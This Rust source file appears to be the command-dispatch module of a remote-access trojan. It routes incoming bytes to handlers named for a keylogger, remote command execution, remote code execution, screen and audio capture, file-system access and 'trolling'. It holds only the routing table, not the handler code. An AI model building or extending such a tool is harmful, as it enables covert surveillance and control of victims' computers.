use std::collections::HashMap;

use lazy_static::lazy_static;

use crate::{
    handlers::{
        audio::Audio,
        chat::Chat,
        file_system::FileSystem,
        func::{Context, Function, HandlerFn},
        keylogger::KeyLogger,
        remote_cmd::RemoteCMD,
        remote_code_execution::RemoteCodeExecution,
        remote_screen::RemoteScreen,
        task_manager::TaskManager,
        trolling::Trolling, // webcam,
    },
    Connection, Socket,
};

lazy_static! {
    static ref B_TO_HANDLER: HashMap<u8, HandlerFn> = {
        let mut m = HashMap::new();
        m.insert(0, FileSystem::handler as HandlerFn);
        m.insert(1, RemoteScreen::handler as HandlerFn);
        m.insert(2, Trolling::handler as HandlerFn);
        m.insert(3, RemoteCMD::handler as HandlerFn);
        m.insert(4, Audio::handler as HandlerFn);
        m.insert(5, TaskManager::handler as HandlerFn);
        m.insert(6, KeyLogger::handler as HandlerFn);
        m.insert(7, Chat::handler as HandlerFn);
        m.insert(8, RemoteCodeExecution::handler as HandlerFn);
        // m.insert(9, Webcam::handler as HandlerFn);

        m
    };
}

pub fn handle_message(
    bytes: &[u8],
    socket: &mut Socket,
    connection: &Connection,
) -> anyhow::Result<()> {
    let mut ctx = Context::from(socket, connection);
    let function_handler = B_TO_HANDLER
        .get(&bytes[0])
        .ok_or_else(|| anyhow::anyhow!("No such function, recheck first byte of the request"))?;

    function_handler(bytes, &mut ctx)
}
